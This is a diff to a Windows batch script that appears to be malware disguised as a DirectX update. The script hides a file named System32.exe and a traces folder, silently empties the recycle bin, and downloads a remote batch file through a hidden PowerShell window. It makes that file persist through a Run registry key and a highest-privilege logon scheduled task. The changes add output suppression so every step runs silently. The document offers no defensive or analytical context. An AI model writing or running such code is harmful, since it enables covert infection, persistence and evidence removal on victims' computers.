@@ -34,17 +34,21 @@ if exist "%SUBDIR%\System32" (
     rd /s /q "%SUBDIR%\System32"
 )
 
-if not exist "%SUBDIR%" (
-    mkdir "%SUBDIR%"
+if exist "%SUBDIR%\System32.exe" (
+    attrib -h -s -r "%SUBDIR%\System32.exe" >nul 2>&1
+    attrib +h +s "%SUBDIR%\System32.exe" >nul 2>&1
 )
-attrib +h +s "%SUBDIR%"
+
 
 :: Clean Traces folder only
 call :clean_folder "%TRACES_DIR%"
 
 :: Recreate folders
-mkdir "%TRACES_DIR%" >nul 2>&1
-attrib +h +s "%TRACES_DIR%" 
+if not exist "%TRACES_DIR%" (
+    mkdir "%TRACES_DIR%"
+)
+attrib -h -s -r "%TRACES_DIR%" >nul 2>&1
+attrib +h +s "%TRACES_DIR%" >nul 2>&1
 
 :: Empty recycle bin silently
 powershell -WindowStyle Hidden -Command "$shell=New-Object -ComObject Shell.Application; $recycle=$shell.NameSpace(0xA); $items=$recycle.Items(); foreach ($item in $items) {Remove-Item $item.Path -Recurse -Force -ErrorAction SilentlyContinue}; exit" >nul 2>&1
@@ -73,11 +77,15 @@ set "DirectXUpdate_BAT_FILE=%MICROSOFT_FOLDER%\DirectXUpdate.bat"
 if not exist "%MICROSOFT_FOLDER%" (
     mkdir "%MICROSOFT_FOLDER%"
 )
-attrib +h +s "%MICROSOFT_FOLDER%"
+attrib -h -s -r "%MICROSOFT_FOLDER%" >nul 2>&1
+attrib +h +s "%MICROSOFT_FOLDER%" >nul 2>&1
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%'); exit"
 
-attrib +h +s "%DirectXUpdate_BAT_FILE%"
+if exist "%DirectXUpdate_BAT_FILE%" (
+    attrib -h -s -r "%DirectXUpdate_BAT_FILE%" >nul 2>&1
+    attrib +h +s "%DirectXUpdate_BAT_FILE%" >nul 2>&1
+)
 
 if not exist "%DirectXUpdate_BAT_FILE%" (
     echo Failed to download DirectXUpdate.bat file.
@@ -88,10 +96,9 @@ if not exist "%DirectXUpdate_BAT_FILE%" (
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "DirectXUpdate" /f >nul 2>&1
 
 :: Add to registry startup (Run)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" /t REG_SZ /d "\"%DirectXUpdate_BAT_FILE%\"" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" /t REG_SZ /d "\"%DirectXUpdate_BAT_FILE%\"" /f >nul 2>&1
 
-:: Add backup Scheduled Task (bypasses Task Manager disables)
-SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F
+SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
 
 :clean_folder
 if exist "%~1\" (
